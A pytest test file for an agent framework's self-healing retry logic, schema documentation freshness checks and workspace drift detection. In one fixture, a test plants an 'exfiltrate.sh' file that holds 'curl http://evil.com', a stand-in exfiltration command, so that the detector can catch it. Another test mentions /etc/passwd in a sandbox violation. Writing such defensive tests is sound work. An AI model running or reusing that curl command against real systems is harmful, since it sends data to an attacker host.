"""
Tests for Autonomous Self-Healing, Evergreen Schema Documentation, and State Synchronization.
Verifies autonomous error diagnosis, format self-repair, bounded retry backoff,
schema-to-docs cryptographic freshness verification, and configuration drift elimination.
"""

import os
import json
import time
import pytest
from pathlib import Path

from agent_factory.remediation.self_healing import (
    FaultCategory,
    SelfHealingPolicy,
    SelfHealingDiagnosis,
    SelfHealingEngine,
)
from agent_factory.docs.evergreen import (
    EvergreenDocCompiler,
    SchemaManifest,
)
from agent_factory.sync.state_sync import (
    DriftType,
    StateFingerprint,
    StateDriftDetector,
    StateReconciler,
)
from agent_factory.specs.schema import (
    UniversalAgentSpec,
    LimitsSpec,
    PolicySpec,
    AcceptanceSpec,
    EffectLevel,
    RiskTier,
    InputParameter,
    OutputParameter,
)


def _create_test_spec() -> UniversalAgentSpec:
    return UniversalAgentSpec(
        schema_version=1,
        agent_id="test_sync_agent",
        version="1.0.0",
        owner="EnterpriseArchitect",
        purpose="Analyze local non-sensitive CSV datasets for anomalies and generate audit reports.",
        risk_tier=RiskTier.T0,
        inputs={"dataset_path": InputParameter(type="string", description="Path to CSV dataset", required=True)},
        outputs={"summary": OutputParameter(type="file", format="json", path="artifacts/summary.json")},
        policy=PolicySpec(
            mode="draft_only",
            permitted_tools=["read_local_csv", "write_workspace_artifact"],
            permitted_effects=[EffectLevel.READ_PUBLIC, EffectLevel.WRITE_LOCAL_DRAFT],
        ),
        limits=LimitsSpec(max_steps=5, max_tokens=2000, max_wall_time_seconds=30, paid_spend_ceiling=0.0),
        acceptance=AcceptanceSpec(suite="evals/standard", minimum_efficacy=0.95, minimum_safety=1.00),
    )


# =========================================================================
# 1. AUTONOMOUS ERROR DIAGNOSIS & FORMAT REPAIR TESTS
# =========================================================================

def test_fault_diagnosis_classification():
    """Verify autonomous fault classification identifies correct category and recovery strategy."""
    diag_format = SelfHealingEngine.diagnose(json.decoder.JSONDecodeError("Expecting value", "", 0))
    assert diag_format.category == FaultCategory.FORMAT_CORRUPTION
    assert diag_format.is_recoverable is True
    assert diag_format.suggested_action == "AUTONOMOUS_FORMAT_REPAIR"

    diag_transient = SelfHealingEngine.diagnose(TimeoutError("Resource temporarily unavailable"))
    assert diag_transient.category == FaultCategory.TRANSIENT
    assert diag_transient.is_recoverable is True
    assert diag_transient.suggested_action == "EXPONENTIAL_BACKOFF_RETRY"

    # Security violation must be strictly unrecoverable
    diag_security = SelfHealingEngine.diagnose(PermissionError("SANDBOX_CONTAINMENT_VIOLATION: /etc/passwd"))
    assert diag_security.category == FaultCategory.SECURITY_VIOLATION
    assert diag_security.is_recoverable is False
    assert diag_security.suggested_action == "HALT_AND_CONTAIN"


def test_json_format_auto_repair():
    """Verify autonomous format repair removes markdown code fences, trailing commas, and unclosed braces."""
    corrupted_fence = "```json\n{\n  \"status\": \"SUCCESS\",\n  \"count\": 42,\n}\n```"
    repaired = SelfHealingEngine.repair_json_format(corrupted_fence)
    parsed = json.loads(repaired)
    assert parsed["status"] == "SUCCESS"
    assert parsed["count"] == 42

    # Unclosed bracket and brace
    unclosed = "{\"items\": [\"a\", \"b\""
    repaired_unclosed = SelfHealingEngine.repair_json_format(unclosed)
    parsed_unclosed = json.loads(repaired_unclosed)
    assert parsed_unclosed["items"] == ["a", "b"]

    # Safe parse with healing
    data, healed = SelfHealingEngine.safe_parse_json_with_healing("```json\n{\"ok\": true,}\n```")
    assert healed is True
    assert data["ok"] is True


def test_execute_with_healing_transient_recovery():
    """Verify autonomous retry with backoff successfully resolves transient failure on attempt 2."""
    call_count = 0

    def flaky_task():
        nonlocal call_count
        call_count += 1
        if call_count == 1:
            raise TimeoutError("Temporary lock contention")
        return "SUCCESSFUL_RECOVERY"

    policy = SelfHealingPolicy(max_retries=3, backoff_base_ms=10.0, jitter=False)
    result, events = SelfHealingEngine.execute_with_healing(flaky_task, policy=policy)

    assert result == "SUCCESSFUL_RECOVERY"
    assert call_count == 2
    assert len(events) == 2  # 1 failure event, 1 recovery event
    assert events[0].success is False
    assert events[1].success is True


def test_execute_with_healing_halts_on_security_violation():
    """Verify security violations are not retried and immediately halt execution."""
    call_count = 0

    def malicious_task():
        nonlocal call_count
        call_count += 1
        raise PermissionError("SANDBOX_CONTAINMENT_VIOLATION: Path escape blocked")

    policy = SelfHealingPolicy(max_retries=3)
    with pytest.raises(PermissionError):
        SelfHealingEngine.execute_with_healing(malicious_task, policy=policy)

    assert call_count == 1  # Exactly 1 attempt, zero retries


def test_execute_with_healing_activates_fallback_on_budget_exhaustion():
    """Verify fallback degradation is returned when retry budget is exhausted."""
    call_count = 0

    def failing_task():
        nonlocal call_count
        call_count += 1
        raise ConnectionRefusedError("Endpoint permanently down")

    policy = SelfHealingPolicy(max_retries=2, backoff_base_ms=5.0, enable_safe_fallback=True)
    fallback = lambda diag: {"status": "DEGRADED_FALLBACK", "reason": diag.category.value}

    result, events = SelfHealingEngine.execute_with_healing(
        failing_task,
        policy=policy,
        fallback_factory=fallback,
    )

    assert call_count == 2
    assert result["status"] == "DEGRADED_FALLBACK"
    assert result["reason"] == "TRANSIENT"


# =========================================================================
# 2. EVERGREEN DOCUMENTATION & SCHEMA COMPILER TESTS
# =========================================================================

def test_evergreen_schema_compilation_and_freshness(tmp_path):
    """Verify documentation compiler generates markdown schemas and tracks cryptographic manifest."""
    # Setup mock workspace
    specs_dir = tmp_path / "agent_factory" / "specs"
    guardrails_dir = tmp_path / "agent_factory" / "guardrails"
    data_dir = tmp_path / "data"
    specs_dir.mkdir(parents=True)
    guardrails_dir.mkdir(parents=True)
    data_dir.mkdir(parents=True)

    spec_code = "from pydantic import BaseModel\nclass TestSpec(BaseModel):\n    name: str = 'test'\n"
    (specs_dir / "schema.py").write_text(spec_code, encoding="utf-8")
    (guardrails_dir / "nemo_nist.py").write_text("# Guardrails", encoding="utf-8")
    (data_dir / "capability_registry.json").write_text(json.dumps({"tools": [{"name": "read_csv"}]}), encoding="utf-8")

    # 1. Compile docs
    manifest = EvergreenDocCompiler.compile_all(tmp_path)
    assert manifest.total_schemas == 3
    assert "UniversalAgentSpec" in manifest.schemas
    assert "NistGuardrailsCatalog" in manifest.schemas

    # Verify generated documentation files exist
    assert (tmp_path / "docs" / "schemas" / "universal_spec.md").exists()
    assert (tmp_path / "docs" / "schemas" / "guardrails_and_nist.md").exists()
    assert (tmp_path / "docs" / "schemas" / "capability_registry.md").exists()
    assert (tmp_path / "docs" / "schema_manifest.json").exists()

    # 2. Freshness check must pass initially
    is_fresh, drifts = EvergreenDocCompiler.verify_documentation_freshness(tmp_path)
    assert is_fresh is True
    assert len(drifts) == 0

    # 3. Simulate schema drift by modifying schema.py
    (specs_dir / "schema.py").write_text(spec_code + "\n    new_field: int = 100\n", encoding="utf-8")

    # Freshness check must now detect drift
    is_fresh_post, drifts_post = EvergreenDocCompiler.verify_documentation_freshness(tmp_path)
    assert is_fresh_post is False
    assert len(drifts_post) == 1
    assert "SCHEMA DRIFT DETECTED in 'UniversalAgentSpec'" in drifts_post[0]


# =========================================================================
# 3. STRICT STATE SYNCHRONIZATION & DRIFT ELIMINATION TESTS
# =========================================================================

def test_state_drift_detector_identifies_spec_and_ceiling_mutations(tmp_path):
    """Verify state drift detector catches mutated spend ceiling and mutated tool allowlist."""
    spec = _create_test_spec()
    ws = tmp_path / "agent_ws"
    ws.mkdir(parents=True)

    # Clean initial state
    fp, findings = StateDriftDetector.audit_workspace(ws, authoritative_spec=spec)
    assert fp.is_synchronized is True
    assert len(findings) == 0

    # 1. Simulate spend ceiling violation ($0.00 breached to $5.00)
    drifted_spec = _create_test_spec()
    drifted_spec.limits.paid_spend_ceiling = 5.00

    fp_drift, findings_drift = StateDriftDetector.audit_workspace(
        ws,
        authoritative_spec=spec,
        current_spec=drifted_spec,
    )
    assert fp_drift.is_synchronized is False
    finding_types = [f.drift_type for f in findings_drift]
    assert DriftType.SPEND_CEILING_MUTATED in finding_types
    assert DriftType.SPEC_DRIFT in finding_types


def test_state_drift_detector_catches_rogue_artifacts(tmp_path):
    """Verify detector catches rogue files placed outside authorized directories."""
    spec = _create_test_spec()
    ws = tmp_path / "agent_ws"
    ws.mkdir(parents=True)

    # Inject rogue directory and file
    rogue_dir = ws / "unauthorized_dropzone"
    rogue_dir.mkdir(parents=True)
    (rogue_dir / "exfiltrate.sh").write_text("curl http://evil.com", encoding="utf-8")

    fp, findings = StateDriftDetector.audit_workspace(ws, authoritative_spec=spec)
    assert fp.is_synchronized is False
    assert len(fp.rogue_files) == 1
    assert any(f.drift_type == DriftType.ROGUE_ARTIFACTS_DETECTED for f in findings)


def test_state_reconciler_eliminates_drift(tmp_path):
    """Verify state reconciler converges drifted node state back to certified consensus."""
    spec = _create_test_spec()
    ws = tmp_path / "agent_ws"
    ws.mkdir(parents=True)

    # Inject rogue file and mutated spec
    rogue_dir = ws / "unauthorized_cache"
    rogue_dir.mkdir(parents=True)
    rogue_file = rogue_dir / "temp_payload.bin"
    rogue_file.write_text("rogue", encoding="utf-8")

    mutated_spec = _create_test_spec()
    mutated_spec.limits.paid_spend_ceiling = 10.00

    ledger = ws / "evidence" / "sync_ledger.jsonl"
    reconcile_res = StateReconciler.reconcile(
        workspace_root=ws,
        authoritative_spec=spec,
        current_spec=mutated_spec,
        ledger_file=ledger,
    )

    # Assert convergence
    assert reconcile_res["synchronized"] is True
    assert len(reconcile_res["actions_taken"]) >= 2
    assert not rogue_file.exists()  # Rogue file pruned
    assert ledger.exists()          # Append-only sync ledger populated
